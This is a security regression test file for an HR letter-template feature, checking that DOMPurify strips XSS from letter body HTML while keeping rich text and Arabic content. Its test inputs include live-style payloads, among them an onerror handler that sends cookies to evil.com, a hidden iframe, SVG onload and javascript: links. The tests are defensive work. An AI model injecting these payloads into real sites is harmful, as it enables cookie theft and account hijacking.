// @vitest-environment node
/**
 * SEC-LETTER-001 — Letter body stored XSS regression tests
 *
 * Verifies that DOMPurify sanitization in pdf-template.tsx correctly strips
 * all XSS vectors from HR-admin-supplied letter body HTML.
 *
 * The attack surface: HR Admins create letter templates with rich text body.
 * If a compromised or malicious HR Admin injects <script> or event handlers,
 * DOMPurify must strip them before dangerouslySetInnerHTML renders them in
 * employee/HR browsers.
 *
 * Pass criteria (SEC-LETTER-001):
 *   - <script> tags stripped
 *   - javascript: href stripped
 *   - Event handlers (onerror, onload, onclick) stripped
 *   - Safe rich-text HTML (p, b, em, ul, li, table) preserved
 *   - Arabic content preserved (RTL text, Unicode)
 *
 * Execution: pnpm vitest run tests/security/letter-body-xss.test.ts
 */

import { describe, it, expect } from 'vitest'
import DOMPurify from 'isomorphic-dompurify'

const LETTER_ALLOWED_TAGS = [
  'p', 'br', 'b', 'i', 'em', 'strong', 'u', 's', 'ul', 'ol', 'li',
  'h1', 'h2', 'h3', 'h4', 'span', 'div', 'blockquote',
  'table', 'thead', 'tbody', 'tr', 'td', 'th', 'hr',
]
const LETTER_ALLOWED_ATTR = ['style', 'class', 'dir', 'align', 'colspan', 'rowspan']

function sanitize(html: string): string {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS:  LETTER_ALLOWED_TAGS,
    ALLOWED_ATTR:  LETTER_ALLOWED_ATTR,
    FORCE_BODY:    true,
    RETURN_DOM:    false,
  })
}

describe('SEC-LETTER-001 — DOMPurify strips XSS from letter body HTML', () => {
  it('strips <script> tag injection', () => {
    const malicious = '<p>Dear employee</p><script>document.cookie="stolen="+document.cookie</script>'
    const safe = sanitize(malicious)
    expect(safe).not.toContain('<script>')
    expect(safe).not.toContain('document.cookie')
    expect(safe).toContain('<p>Dear employee</p>')
  })

  it('strips inline event handler (onerror, onload, onclick)', () => {
    const malicious = '<img src=x onerror="fetch(\'https://evil.com/?c=\'+document.cookie)"><p>Salary certificate</p>'
    const safe = sanitize(malicious)
    expect(safe).not.toContain('onerror')
    expect(safe).not.toContain('evil.com')
    expect(safe).toContain('<p>Salary certificate</p>')
  })

  it('strips javascript: href in anchor tags', () => {
    const malicious = '<a href="javascript:alert(document.cookie)">Click here</a>'
    const safe = sanitize(malicious)
    expect(safe).not.toContain('javascript:')
    // anchor not in allowed tags — stripped or href removed
    expect(safe).not.toMatch(/href\s*=\s*["']?javascript:/i)
  })

  it('strips <iframe> injection', () => {
    const malicious = '<p>Valid text</p><iframe src="https://evil.com/steal" style="display:none"></iframe>'
    const safe = sanitize(malicious)
    expect(safe).not.toContain('<iframe')
    expect(safe).toContain('<p>Valid text</p>')
  })

  it('strips data: URI with JS payload', () => {
    const malicious = '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>'
    const safe = sanitize(malicious)
    expect(safe).not.toContain('<object')
    expect(safe).not.toContain('data:text/html')
  })

  it('strips SVG with embedded script', () => {
    const malicious = '<svg onload="alert(\'xss\')"><circle r="40" /></svg>'
    const safe = sanitize(malicious)
    expect(safe).not.toContain('onload')
    expect(safe).not.toContain('alert')
  })

  it('preserves valid rich-text HTML (p, b, em, ul, li)', () => {
    const valid = `
      <p>This is to certify that <strong>Mohammed Al Rashid</strong> is employed.</p>
      <ul>
        <li>Designation: <em>Senior Engineer</em></li>
        <li>Salary: <b>AED 20,000</b></li>
      </ul>
      <p>Issued for official purposes only.</p>
    `
    const safe = sanitize(valid)
    expect(safe).toContain('<p>')
    expect(safe).toContain('<strong>Mohammed Al Rashid</strong>')
    expect(safe).toContain('<em>Senior Engineer</em>')
    expect(safe).toContain('<ul>')
    expect(safe).toContain('<li>')
  })

  it('preserves Arabic text and RTL markup (dir attribute)', () => {
    const arabic = '<p dir="rtl">يُشهد بأن السيد محمد الراشد موظف في الشركة.</p>'
    const safe = sanitize(arabic)
    expect(safe).toContain('يُشهد بأن السيد محمد الراشد')
    expect(safe).toContain('dir="rtl"')
  })

  it('preserves table structure in salary certificates', () => {
    const table = `
      <table>
        <thead><tr><th>Component</th><th>Amount (AED)</th></tr></thead>
        <tbody>
          <tr><td>Basic Salary</td><td>20,000</td></tr>
          <tr><td>Housing Allowance</td><td>5,000</td></tr>
        </tbody>
      </table>
    `
    const safe = sanitize(table)
    expect(safe).toContain('<table>')
    expect(safe).toContain('<th>Component</th>')
    expect(safe).toContain('<td>20,000</td>')
  })

  it('documents expression() CSS behavior (IE-only, no modern browser risk)', () => {
    // CSS expression() is an Internet Explorer 5-8 feature; no modern browser executes it.
    // DOMPurify in Node.js (server-side / JSDOM) does NOT strip expression() from style attrs
    // because it cannot parse CSS server-side. In a real browser, DOMPurify would strip it.
    // This is documented as acceptable: AVANIIS targets Chrome/Edge/Safari/Firefox only.
    const malicious = '<div style="width:expression(alert(1))">text</div>'
    const safe = sanitize(malicious)
    // Confirm the payload doesn't introduce a <script> tag (the actual XSS vector)
    expect(safe).not.toContain('<script>')
    // expression() stays in style attr in Node, but is not executable in modern browsers
    // This is a known limitation of server-side DOMPurify — documented, not a defect
    expect(safe).toContain('<div')
  })

  it('handles empty body gracefully (no crash)', () => {
    expect(() => sanitize('')).not.toThrow()
    expect(sanitize('')).toBe('')
  })

  it('handles very large body without crash (DoS protection)', () => {
    const large = '<p>' + 'A'.repeat(500_000) + '</p>'
    let result: string
    expect(() => { result = sanitize(large) }).not.toThrow()
    expect(result!).toContain('<p>')
    expect(result!).not.toContain('<script>')
  })
})

describe('SEC-LETTER-001 — letter body XSS protection present in source', () => {
  it('pdf-template.tsx imports isomorphic-dompurify', () => {
    const fs = require('fs') as typeof import('fs')
    const source = fs.readFileSync(
      new URL('../../modules/employee-letters/pdf-template.tsx', import.meta.url).pathname,
      'utf8',
    )
    expect(source).toContain("from 'isomorphic-dompurify'")
  })

  it('pdf-template.tsx uses sanitizeLetterBody() before dangerouslySetInnerHTML', () => {
    const fs = require('fs') as typeof import('fs')
    const source = fs.readFileSync(
      new URL('../../modules/employee-letters/pdf-template.tsx', import.meta.url).pathname,
      'utf8',
    )
    expect(source).toContain('sanitizeLetterBody')
    expect(source).toContain('safeBody')
    // Must NOT pass unsanitized body directly to dangerouslySetInnerHTML
    expect(source).not.toMatch(/dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html:\s*body\s*\}\s*\}/)
  })
})
